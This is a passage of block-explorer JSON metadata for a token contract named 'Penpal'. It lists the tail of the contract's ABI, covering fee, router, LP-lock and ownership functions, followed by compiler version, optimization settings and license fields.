"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isExcludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isMarketPair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"lockLPAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"magnitude\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFenHongToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSwapNum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minUsdtVal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"setCreator\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"d\",\"type\":\"uint256\"}],\"name\":\"setDailyDuration\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"setDistributorGas\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"mfee\",\"type\":\"uint256\"}],\"name\":\"setFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newval\",\"type\":\"address\"}],\"name\":\"setHandle\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"newValue\",\"type\":\"bool\"}],\"name\":\"setIsExcludedFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accountArray\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"newValue\",\"type\":\"bool\"}],\"name\":\"setIsExcludedFromFeeByArray\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketAddress\",\"type\":\"address\"}],\"name\":\"setMarketAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"setMinFenHongToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"n1\",\"type\":\"uint256\"}],\"name\":\"setMinSwapNum\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"setMinUsdtVals\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"nftAddress\",\"type\":\"address\"}],\"name\":\"setNFTAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"rate\",\"type\":\"uint256\"}],\"name\":\"setReleaseLPDailyRate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"router\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"key\",\"type\":\"bool\"}],\"name\":\"setRouter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"num\",\"type\":\"bool\"}],\"name\":\"setSwitchDivid\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accountArray\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setWhiteUserPrice\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"}],\"name\":\"setstartTradeTime\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenaddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"takeOutErrorTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"newlpAmount\",\"type\":\"uint256\"}],\"name\":\"updateLPAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"newlockAmount\",\"type\":\"uint256\"}],\"name\":\"updateLPLockAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"wapV2RouterAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "Penpal", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU GPLv3", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://b833a2edd5579ecb33966a7617431e1605e31e071e20808090964df083b6b46c"}